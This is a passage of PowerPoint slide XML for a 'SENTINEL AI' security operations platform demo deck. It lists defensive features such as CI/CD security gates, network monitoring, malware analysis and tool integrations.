            <a:off x="8141208" y="5221224"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ CI/CD pipeline security gate status across all repositories</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77" name="TextBox 76"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8141208" y="5458968"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ SCA (software composition analysis), SAST, and secrets scanning per repo</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="78" name="TextBox 77"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8141208" y="5696712"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Policy engine: automatically block PR merge on critical CVE introduction</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="79" name="TextBox 78"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8141208" y="5934456"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Supports GitHub Actions, GitLab CI, Jenkins, and CircleCI pipelines</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="80" name="TextBox 79"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8141208" y="6172200"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Dashboard shows gate pass rate, blocked PRs, and top failing rules</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81" name="Rectangle 80"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="6601968"/>
            <a:ext cx="3837432" cy="1664208"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>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28600" y="6601968"/>
            <a:ext cx="3837432" cy="457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20040" y="6693408"/>
            <a:ext cx="3654552" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="900" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Network Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="84" name="TextBox 83"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="6949440"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Firewall rule analysis — identifies over-permissive rules and anomalies</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85" name="TextBox 84"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="7187184"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ East-west traffic monitoring between internal network segments</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="86" name="TextBox 85"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="7424928"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Anomalous connection alerts — sudden new connections between services</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87" name="TextBox 86"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="7662672"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Network topology view with open routes highlighted as potential attack paths</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="88" name="TextBox 87"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="7900416"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Alert feed integrates with Incident Response for automatic triage</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="89" name="Rectangle 88"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4139184" y="6601968"/>
            <a:ext cx="3837432" cy="1664208"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="63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4139184" y="6601968"/>
            <a:ext cx="3837432" cy="4572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30624" y="6693408"/>
            <a:ext cx="3654552" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="900" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Malware Analysis</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="92" name="TextBox 91"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4230624" y="6949440"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Static analysis: file hash matching, PE header inspection, string extraction</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="93" name="TextBox 92"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4230624" y="7187184"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Dynamic analysis: behavioural sandbox — process tree, network calls, file writes</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="94" name="TextBox 93"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4230624" y="7424928"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ IOC extraction: IP addresses, domains, file hashes, registry keys</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="95" name="TextBox 94"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4230624" y="7662672"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ YARA rule matching against known malware families</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="96" name="TextBox 95"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4230624" y="7900416"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Kill chain stage classification — maps sample to MITRE ATT&amp;CK phases</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="97" name="Rectangle 96"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8049768" y="6601968"/>
            <a:ext cx="3837432" cy="1664208"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="635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8049768" y="6601968"/>
            <a:ext cx="3837432"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141208" y="6693408"/>
            <a:ext cx="3654552" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="900" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Integrations</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="100" name="TextBox 99"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8141208" y="6949440"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Connect external tools: GitHub, GitLab, AWS, GCP, Azure, Jira, Slack, PagerDuty</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="101" name="TextBox 100"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8141208" y="7187184"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ CVE feed configuration: NVD, CISA KEV, EPSS refresh intervals</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="102" name="TextBox 101"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8141208" y="7424928"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Per-integration status: Connected / Warning / Disconnected with last sync time</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="103" name="TextBox 102"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8141208" y="7662672"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ Webhook configuration for outbound alerts (Slack channels, PagerDuty services)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="104" name="TextBox 103"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8141208" y="7900416"/>
            <a:ext cx="3654552" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>▸ API key management with masked display and rotation reminders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D14"/>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685800"/>
            <a:ext cx="9418320" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="5600" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SENTINEL AI</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="TextBox 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1371600" y="1737360"/>
            <a:ext cx="9418320" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="1600" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>AI-Powered Security Operations — Platform Summary</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="TextBox 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1371600" y="2176272"/>
            <a:ext cx="9418320" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="1100" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>GlobalShip Logistics Demo Environment — 18-slide walkthrough of all major features</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3200400" y="2560320"/>
            <a:ext cx="5760720" cy="27432"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E28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2743200"/>
            <a:ext cx="3611880" cy="804672"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="63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788920"/>
            <a:ext cx="685800" cy="594360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="3000" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>12</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="TextBox 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1325880" y="2798064"/>
            <a:ext cx="1325880" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="900" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVEs tracked and
EPSS-ranked</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2697480" y="2798064"/>
            <a:ext cx="1234440" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Log4Shell · Spring4Shell
Redis RCE · Grafana · Kafka</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4206240" y="2743200"/>
            <a:ext cx="3611880" cy="804672"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="63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2788920"/>
            <a:ext cx="685800" cy="594360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="3000" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>10</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="TextBox 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5120640" y="2798064"/>
            <a:ext cx="1325880" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="900" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Assets fully
monitored</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="TextBox 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="2798064"/>
            <a:ext cx="1234440" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Servers · services
containers · IoT gateway</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Rectangle 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8001000" y="2743200"/>
            <a:ext cx="3611880" cy="804672"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="63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2788920"/>
            <a:ext cx="685800" cy="594360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
